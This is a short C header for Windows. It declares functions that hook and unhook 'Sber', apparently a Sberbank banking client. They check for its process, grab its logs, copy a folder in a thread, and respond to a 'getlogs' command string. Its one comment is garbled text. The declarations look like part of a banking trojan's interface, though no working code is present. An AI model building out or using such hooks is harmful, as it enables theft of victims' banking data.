#ifndef		SBERH
#define		SBERH

#include <windows.h>


//*********************************************************************
bool UnHookSber();

//*********************************************************************
bool HookSber();

//*********************************************************************
bool WINAPI IsSberProcess();
bool HookSberApi();
DWORD WINAPI grabsberlog();
const static char GetSberLog[] = "getlogs\0";
DWORD WINAPI CopyFolderThread( LPVOID lpData );

// ��������� ��� ������ ���� ���� � ����� � ���� �����, � ������� ���� �� ����������
void FirstInitSber();

#endif		//SBERH